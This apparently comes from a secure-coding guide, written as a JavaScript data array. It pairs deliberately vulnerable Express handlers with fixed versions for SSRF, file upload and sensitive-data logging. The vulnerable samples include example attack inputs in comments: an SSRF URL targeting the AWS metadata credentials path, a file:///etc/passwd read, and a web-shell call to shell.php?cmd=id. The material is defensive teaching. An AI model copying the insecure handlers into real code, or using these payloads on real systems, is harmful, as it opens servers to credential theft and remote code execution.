  // ─── SSRF ──────────────────────────────────────────────────────────────────
  {
    id: "sc-ssrf-01",
    category: "SSRF",
    severity: "high",
    title: "SSRF — Validate and allowlist URLs before making server-side requests",
    description:
      "SSRF (Server-Side Request Forgery) tricks the server into fetching internal URLs. Attackers use it to hit cloud metadata endpoints (169.254.169.254), internal services, or scan the network.",
    realWorldExample:
      "2019: Capital One SSRF via misconfigured WAF. Attacker used SSRF to access AWS IMDSv1 metadata endpoint (169.254.169.254), stole IAM credentials, then downloaded 100M customer records from S3.",
    badCode: `// ❌ DANGEROUS — Unvalidated URL fetch (SSRF)
const axios = require('axios');

app.post('/api/fetch-preview', authenticate, async (req, res) => {
  const { url } = req.body;
  // Attacker sends: url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role"
  // Or: url = "http://internal-admin.company.local/admin/users"
  // Or: url = "file:///etc/passwd"
  const response = await axios.get(url);
  res.json({ content: response.data });
});`,
    goodCode: `// ✅ SECURE — URL validation + allowlist + private IP block
const axios = require('axios');
const dns = require('dns').promises;
const { isIP } = require('net');
const ipRangeCheck = require('ip-range-check');

// Private/internal IP ranges to block
const BLOCKED_RANGES = [
  '10.0.0.0/8',          // Private
  '172.16.0.0/12',       // Private
  '192.168.0.0/16',      // Private
  '127.0.0.0/8',         // Loopback
  '169.254.0.0/16',      // Link-local (AWS metadata!)
  '::1/128',             // IPv6 loopback
  'fc00::/7',            // IPv6 private
];

async function isSafeUrl(rawUrl) {
  let parsed;
  try { parsed = new URL(rawUrl); }
  catch { return false; }

  // Only allow HTTPS
  if (parsed.protocol !== 'https:') return false;

  // Resolve hostname to IP and check it's not internal
  let addresses;
  try { addresses = await dns.resolve4(parsed.hostname); }
  catch { return false; }

  for (const ip of addresses) {
    if (ipRangeCheck(ip, BLOCKED_RANGES)) return false;
  }

  return true;
}

// Allowlist approach (more secure): only allow specific domains
const ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.partner.io'];

app.post('/api/fetch-preview', authenticate, async (req, res) => {
  const { url } = req.body;

  // Option 1: Allowlist
  const { hostname } = new URL(url);
  if (!ALLOWED_DOMAINS.includes(hostname)) {
    return res.status(400).json({ error: 'Domain not permitted' });
  }

  // Option 2: IP check
  if (!(await isSafeUrl(url))) {
    return res.status(400).json({ error: 'URL not permitted' });
  }

  const response = await axios.get(url, { timeout: 5000, maxRedirects: 0 });
  res.json({ content: response.data });
});`,
    tools: ["OWASP ZAP", "Burp Suite Collaborator", "IMDSv2 (AWS)"],
    cvss: 8.6,
    cwe: "CWE-918",
    references: ["Capital One breach 2019", "OWASP A10:2021"],
  },

  // ─── FILE UPLOAD ───────────────────────────────────────────────────────────
  {
    id: "sc-file-01",
    category: "File Upload",
    severity: "high",
    title: "File Upload — Validate type, scan for malware, store outside webroot",
    description:
      "Unrestricted file upload lets attackers upload web shells (PHP, JSP) and execute arbitrary code on the server. Even image uploads need magic byte validation.",
    realWorldExample:
      "2021: GitLab RCE (CVSS 10.0) via image file upload — ExifTool parsed metadata from uploaded images, enabling command injection through crafted DjVu files. 11,000+ vulnerable instances.",
    badCode: `// ❌ DANGEROUS — No file validation
const multer = require('multer');
const upload = multer({ dest: 'public/uploads/' });  // ❌ Stored in webroot

app.post('/upload', upload.single('file'), (req, res) => {
  // No type checking — attacker uploads shell.php
  // No size limit — DoS via huge files
  // Stored in webroot — directly accessible via browser
  // Original filename used — path traversal possible
  res.json({ path: '/uploads/' + req.file.filename });
  // Now attacker visits: https://yoursite.com/uploads/shell.php?cmd=id
});`,
    goodCode: `// ✅ SECURE — Validated file upload with virus scan
const multer  = require('multer');
const sharp   = require('sharp');       // Image processing (strips metadata)
const crypto  = require('crypto');
const path    = require('path');
const storage = require('@google-cloud/storage'); // or AWS S3

// In-memory storage first — validate before writing to disk
const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: 5 * 1024 * 1024,  // 5 MB max
    files: 1,
  },
  fileFilter: (req, file, cb) => {
    const allowed = ['image/jpeg', 'image/png', 'image/webp'];
    if (!allowed.includes(file.mimetype)) {
      return cb(new Error('Only JPEG, PNG, WebP allowed'), false);
    }
    cb(null, true);
  },
});

app.post('/upload', authenticate, upload.single('avatar'), async (req, res) => {
  const buffer = req.file.buffer;

  // 1. Validate magic bytes (not just MIME type from client)
  const magicBytes = buffer.slice(0, 4).toString('hex');
  const validMagic = {
    'ffd8ffe0': 'jpeg', 'ffd8ffe1': 'jpeg', 'ffd8ffe2': 'jpeg',
    '89504e47': 'png',
    '52494646': 'webp',
  };
  if (!Object.keys(validMagic).some(m => magicBytes.startsWith(m))) {
    return res.status(400).json({ error: 'Invalid file type' });
  }

  // 2. Re-encode through Sharp — strips EXIF, prevents polyglot attacks
  const safeImage = await sharp(buffer)
    .resize(512, 512, { fit: 'inside' })
    .jpeg({ quality: 80 })
    .toBuffer();

  // 3. Generate random filename — no user-controlled path component
  const filename = crypto.randomBytes(16).toString('hex') + '.jpg';

  // 4. Store outside webroot in cloud storage (not directly accessible)
  await bucket.file(\`avatars/\${req.user.sub}/\${filename}\`).save(safeImage);

  // 5. Return CDN URL (signed, time-limited) — never a direct path
  const signedUrl = await bucket.file(\`avatars/\${req.user.sub}/\${filename}\`).getSignedUrl({
    action: 'read', expires: Date.now() + 3600 * 1000,
  });

  res.json({ url: signedUrl[0] });
});`,
    tools: ["ClamAV", "VirusTotal API", "Sharp (image processing)", "OWASP File Upload Cheatsheet"],
    cvss: 9.8,
    cwe: "CWE-434",
    references: ["CVE-2021-22205", "OWASP A03:2021"],
  },

  // ─── LOGGING ───────────────────────────────────────────────────────────────
  {
    id: "sc-log-01",
    category: "Logging & Monitoring",
    severity: "high",
    title: "Logging — Never log sensitive data; always log security events",
    description:
      "Logging passwords, tokens, PII, or card numbers creates a secondary breach vector. Log files are often stored unencrypted, shared broadly, or retained for years. At the same time, insufficient logging means breaches go undetected for months.",
    realWorldExample:
      "2019: Twitter accidentally logged plaintext passwords in internal logs due to a bug. Passwords were stored before the hashing function ran. 330 million users advised to change passwords.",
    badCode: `// ❌ DANGEROUS — Logging sensitive data
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  console.log(\`Login attempt: \${email} / \${password}\`);  // ❌ Password in logs!
  // ...
});

// Logging full request body (may contain CC numbers, SSN, tokens)
app.use((req, res, next) => {
  console.log('Request:', JSON.stringify(req.body));  // ❌ Logs everything
  next();
});

// Error logging with stack trace including user data
app.use((err, req, res, next) => {
  console.error('Error:', err, 'User data:', req.user);  // ❌
});`,
    goodCode: `// ✅ SECURE — Structured logging with sensitive field redaction
const pino = require('pino');

const SENSITIVE_FIELDS = new Set([
  'password', 'password_hash', 'passwordHash', 'token', 'access_token',
  'refresh_token', 'api_key', 'apiKey', 'secret', 'cvv', 'card_number',
  'ssn', 'credit_card', 'authorization',
]);

function redact(obj, depth = 0) {
  if (depth > 5 || typeof obj !== 'object' || !obj) return obj;
  const out = {};
  for (const [k, v] of Object.entries(obj)) {
    out[k] = SENSITIVE_FIELDS.has(k.toLowerCase()) ? '[REDACTED]' : redact(v, depth + 1);
  }
  return out;
}

const logger = pino({
  level: process.env.LOG_LEVEL || 'info',
  serializers: {
    req: (req) => ({
      method: req.method,
      url: req.url,
      userId: req.user?.sub,
      // NO body, NO headers (could contain Authorization)
    }),
    err: pino.stdSerializers.err,
  },
});

// Security events to ALWAYS log (for SIEM alerting):
function logSecurityEvent(type, details) {
  logger.warn({
    event: type,
    timestamp: new Date().toISOString(),
    ip: details.ip,
    userId: details.userId,
    ...redact(details),  // Redact any sensitive fields
  });
}

// Usage:
// logSecurityEvent('auth.login_failure', { ip, email, attempts: 5 });
// logSecurityEvent('auth.lockout', { ip, email });
// logSecurityEvent('access.denied', { ip, userId, resource: '/admin' });
// logSecurityEvent('api_key.invalid', { ip, keyPrefix: key.slice(0,8) });`,
    tools: ["Pino", "Winston", "Splunk", "ELK Stack", "Datadog"],
    cvss: 6.5,
    cwe: "CWE-532",
    references: ["Twitter password logging 2019", "OWASP A09:2021"],
  },
];
